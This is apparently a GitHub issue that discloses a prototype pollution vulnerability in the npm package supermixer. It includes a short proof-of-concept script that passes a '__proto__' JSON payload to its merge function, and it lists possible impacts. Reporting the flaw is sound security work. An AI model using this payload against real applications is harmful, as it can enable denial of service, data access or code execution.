# Prototype pollution #9

## Description

![@u0pattern](https://avatars.githubusercontent.com/u/21009276?v=4&size=48)[u0pattern](https://github.com/u0pattern)opened [on Aug 20, 2020](https://github.com/stampit-org/supermixer/issues/9#issue-682331920)

I would like to report a Prototype pollution in supermixer, It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation.

# Vulnerability Description:

Prototype Pollution is a vulnerability affecting JavaScript, Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects.

# Proof of Concept:

```
var mixer = require('supermixer');
var payload = '{"__proto__":{"poc":"evil"}}';
var test = {};
console.log("Before: ", test.poc);
mixer.merge({},JSON.parse(payload));
console.log("After: ", test.poc);
```
# Impact :

DoS, Access to restricted data, RCE (depends on implementation)
